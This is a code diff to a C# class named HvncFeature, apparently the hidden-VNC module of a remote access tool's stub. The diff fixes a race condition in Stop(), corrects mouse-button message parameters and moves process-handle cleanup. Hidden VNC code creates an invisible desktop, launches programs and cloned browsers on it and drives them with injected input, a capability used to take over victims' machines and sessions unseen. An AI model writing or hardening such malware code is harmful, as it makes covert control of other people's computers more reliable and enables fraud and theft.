@@ -420,7 +420,15 @@ internal static class HvncFeature
 
     public static void Stop()
     {
-        if (Interlocked.Exchange(ref _stopping, 1) != 0) return; // prevent concurrent double-free
+        if (Interlocked.Exchange(ref _stopping, 1) != 0)
+        {
+            // Start() calls Stop() before allocating new resources; if StopCore() is still
+            // running (e.g. waiting for _captureThread.Join) it would free the new session's
+            // GDI handles on return. Spin until StopCore() finishes (clears _stopping → 0)
+            // so the caller is always past the free before it proceeds.
+            SpinWait.SpinUntil(() => Volatile.Read(ref _stopping) == 0, 6000);
+            return;
+        }
         try { StopCore(); } finally { Interlocked.Exchange(ref _stopping, 0); }
     }
 
@@ -450,11 +458,10 @@ internal static class HvncFeature
             // Do NOT call CloseDesktop/GdiplusShutdown under a live thread (UB / crash).
             // Zero ALL composite + desktop fields so Start() allocates fresh resources.
             FreeWinCache();
+            FreeComposite();
             _h264Enc?.Dispose(); _h264Enc = null;
             if (_compHdcRef != 0) { ReleaseDC(0, _compHdcRef); _compHdcRef = 0; }
             _hDesktop = 0; _gdipToken = 0;
-            _compHdc = 0; _compHbm = 0; _compBits = 0;
-            _compW = 0; _compH = 0;
         }
 
         _movingWindow    = false;
@@ -1299,10 +1306,13 @@ internal static class HvncFeature
                         SendMessageTimeout(upTarget, WM_MOUSEMOVE, (nint)MK_LBUTTON, lParam, SMTO_ABORTIFHUNG, 50, out _);
                     else
                         PostMessage(upTarget, WM_MOUSEMOVE, (nint)MK_LBUTTON, lParam);
+                    nint upWParam = (_rightButtonDown  ? (nint)MK_RBUTTON : 0)
+                                  | (_middleButtonDown ? (nint)MK_MBUTTON : 0)
+                                  | (_shiftDown ? (nint)0x0004 : 0) | (_ctrlDown ? (nint)0x0008 : 0);
                     if (useSync)
-                        SendMessageTimeout(upTarget, WM_LBUTTONUP, 0, lParam, SMTO_ABORTIFHUNG, 200, out _);
+                        SendMessageTimeout(upTarget, WM_LBUTTONUP, upWParam, lParam, SMTO_ABORTIFHUNG, 200, out _);
                     else
-                        PostMessage(upTarget, WM_LBUTTONUP, 0, lParam);
+                        PostMessage(upTarget, WM_LBUTTONUP, upWParam, lParam);
                 }
                 break;
             }
@@ -2517,6 +2527,8 @@ internal static class HvncFeature
             {
                 if (envBlock    != 0) DestroyEnvironmentBlock(envBlock);
                 if (launchToken != 0) CloseHandle(launchToken);
+                if (pi.hProcess != 0) { CloseHandle(pi.hProcess); pi.hProcess = 0; }
+                if (pi.hThread  != 0) { CloseHandle(pi.hThread);  pi.hThread  = 0; }
             }
             StubLog.Info($"[HVNC] LaunchOnDesktop '{path}' pid={pi.dwProcessId}");
             if (pi.dwProcessId != 0) _launchedPids[pidKey] = pi.dwProcessId;
@@ -2537,8 +2549,6 @@ internal static class HvncFeature
                     LaunchOnDesktop(retryPath, isRetry: true, cloneBrowser: retryClone);
                 });
             }
-            if (pi.hProcess != 0) CloseHandle(pi.hProcess);
-            if (pi.hThread  != 0) CloseHandle(pi.hThread);
             }
             finally { Marshal.FreeHGlobal(deskPtr); }
         }
